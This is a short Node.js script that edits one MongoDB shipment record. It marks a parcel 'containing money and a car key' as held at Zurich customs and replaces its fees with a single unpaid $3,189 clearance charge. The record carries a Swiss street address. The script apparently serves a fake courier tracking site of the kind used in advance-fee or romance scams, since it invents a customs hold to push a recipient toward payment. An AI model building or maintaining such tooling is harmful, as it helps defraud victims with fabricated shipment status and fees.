// utils/updateToCustomClearance.js
import mongoose from 'mongoose';
import dotenv from 'dotenv';
import dns from 'dns';
import Shipment from '../models/Shipment.js';

dotenv.config();

dns.setDefaultResultOrder('ipv4first');
dns.setServers(['8.8.8.8', '1.1.1.1']);

const TRACKING_ID = 'TCG-883011516487';
const CUSTOM_CLEARANCE_FEE = 3189.00;

// ✅ Must match the enum in models/Shipment.js
const CUSTOMS_STATUS = 'Customs Fee Pending';

// ─── Date helpers ───────────────────────────────────────────────────
const pad = (n) => String(n).padStart(2, '0');
const fmtDate = (d) => `${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())}`;
const fmtDateTime = (d) => `${fmtDate(d)} ${pad(d.getHours())}:${pad(d.getMinutes())}`;

const now = new Date();
const nowStr = fmtDateTime(now);

const updateShipment = async () => {
  try {
    await mongoose.connect(process.env.MONGODB_URI);
    console.log('✅ Connected to MongoDB');

    const shipment = await Shipment.findOne({ id: TRACKING_ID });
    if (!shipment) {
      console.error(`❌ No shipment found with id: ${TRACKING_ID}`);
      await mongoose.disconnect();
      process.exit(1);
    }

    console.log(`📦 Found shipment: ${shipment.id} | ${shipment.customer} | current status: ${shipment.status}`);

    // ─── Rebuild the timeline ────────────────────────────────────────
    const updatedSteps = (shipment.steps || []).map((step) => {
      const event = (step.event || '').toLowerCase();
      const plain = step.toObject?.() ?? step;

      if (event === 'order received' || event === 'shipment processed' || event === 'in transit') {
        return { ...plain, status: 'completed' };
      }

      if (event.includes('custom') || event.includes('clearance')) {
        return {
          ...plain,
          event: 'Import Custom Clearance',
          status: 'active',
          description: `Shipment is undergoing import customs clearance. Customs fee of $${CUSTOM_CLEARANCE_FEE.toLocaleString('en-US', { minimumFractionDigits: 2 })} is pending payment before release.`,
          date: nowStr,
          location: 'Zurich Customs Hub, Switzerland'
        };
      }

      return { ...plain, status: 'upcoming' };
    });

    // Insert the clearance step if missing
    const hasClearanceStep = updatedSteps.some((s) =>
      (s.event || '').toLowerCase().includes('clearance') ||
      (s.event || '').toLowerCase().includes('custom')
    );

    if (!hasClearanceStep) {
      const inTransitIdx = updatedSteps.findIndex((s) =>
        (s.event || '').toLowerCase() === 'in transit'
      );
      const insertAt = inTransitIdx >= 0 ? inTransitIdx + 1 : updatedSteps.length;
      updatedSteps.splice(insertAt, 0, {
        event: 'Import Custom Clearance',
        status: 'active',
        description: `Shipment is undergoing import customs clearance. Customs fee of $${CUSTOM_CLEARANCE_FEE.toLocaleString('en-US', { minimumFractionDigits: 2 })} is pending payment before release.`,
        date: nowStr,
        location: 'Zurich Customs Hub, Switzerland'
      });
    }

    // ─── Top-level fields ───────────────────────────────────────────
    shipment.status = CUSTOMS_STATUS;
    shipment.location = 'Zurich Customs Hub, Switzerland – awaiting clearance fee';
    shipment.description =
      'High-value international shipment containing money and a car key. ' +
      'Currently held at customs for import clearance into Switzerland. ' +
      `A customs clearance fee of $${CUSTOM_CLEARANCE_FEE.toLocaleString('en-US', { minimumFractionDigits: 2 })} is pending before release.`;
    shipment.dateTime = now.toISOString();
    shipment.lastUpdated = now.toISOString();
    shipment.nextAction = `Pay customs clearance fee of $${CUSTOM_CLEARANCE_FEE.toLocaleString('en-US', { minimumFractionDigits: 2 })} to proceed`;

    // ─── Fees: REPLACE with just the single unpaid customs fee ──────
    shipment.fees = {
      total: CUSTOM_CLEARANCE_FEE,
      currency: 'USD',
      paid: false,
      breakdown: [
        { label: 'Import Custom Clearance Fee', amount: CUSTOM_CLEARANCE_FEE }
      ]
    };

    shipment.specialInstructions =
      'High-value parcel containing money and a car key. Enclosed and sealed container required. ' +
      'Anti-theft seals. Do not stack. Shipment currently undergoing import customs clearance in Switzerland. ' +
      `Custom clearance fee of $${CUSTOM_CLEARANCE_FEE.toLocaleString('en-US', { minimumFractionDigits: 2 })} must be settled before release. ` +
      'Destination: Walderstrasse 7, 8340 Hinwil, Switzerland – hold for collection or local delivery arrangement.';

    shipment.steps = updatedSteps;
    shipment.history = updatedSteps;
    shipment.markModified('steps');
    shipment.markModified('history');
    shipment.markModified('fees');

    await shipment.save();

    console.log(`✅ Shipment ${shipment.id} updated`);
    console.log(`📌 Status: ${shipment.status}`);
    console.log(`📍 Location: ${shipment.location}`);
    console.log(`➡️  Next action: ${shipment.nextAction}`);
    console.log(`💵 Fees total (unpaid): $${CUSTOM_CLEARANCE_FEE.toFixed(2)}`);
    console.log(`   • Import Custom Clearance Fee — $${CUSTOM_CLEARANCE_FEE.toFixed(2)}`);

    await mongoose.disconnect();
    console.log('🔌 Disconnected from MongoDB');
  } catch (err) {
    console.error('❌ Error:', err);
    await mongoose.disconnect();
    process.exit(1);
  }
};

updateShipment();